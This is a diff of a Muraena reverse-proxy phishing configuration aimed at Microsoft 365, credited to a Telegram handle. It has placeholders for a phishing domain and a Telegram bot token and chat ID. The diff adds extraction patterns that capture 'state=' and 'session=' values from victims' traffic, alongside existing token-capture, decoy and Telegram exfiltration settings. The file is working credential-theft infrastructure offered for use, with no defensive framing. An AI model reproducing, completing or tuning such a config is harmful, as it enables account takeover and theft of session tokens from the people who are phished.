@@ -1,6 +1,6 @@
 #############################################################################
 # MURAENA — O365 COMBINED CONFIG by t.me/officialmonsterz
-# Merged: token-capture skeleton + full watchdog/redirect/decoy hardening
+# Merged: token-capture + full watchdog/redirect/decoy hardening
 # Placeholders to replace: YOUR-PHISHING-DOMAIN.COM, YOUR-TG-BOT-TOKEN, YOUR-TG-CHAT-ID
 #############################################################################
 
@@ -110,8 +110,9 @@
         header = "X-Ms-Client-DNS"
 
         [tracking.trace.landing]
-        type = "query"
-        header = "X-Ms-Client-Region"
+            type = "query"
+            header = "X-Ms-Client-Region"
+            # redirectTo is only used when type = "path". Not needed for query mode.
 
 [tracking.secrets]
     paths = [
@@ -172,6 +173,16 @@
     start = "session_state="
     end = "&"
 
+    [[tracking.secrets.patterns]]
+    label = "Session State (compact)"
+    start = "state="
+    end = "&"
+
+    [[tracking.secrets.patterns]]
+    label = "Session Identifier"
+    start = "session="
+    end = "&"
+
 [necrobrowser]
     enable = false
     endpoint = "http://10.0.0.2:3000/instrument"
@@ -201,4 +212,3 @@
     enable = true
     botToken = "YOUR-TG-BOT-TOKEN"
     chatIDs = ["YOUR-TG-CHAT-ID"]
-	
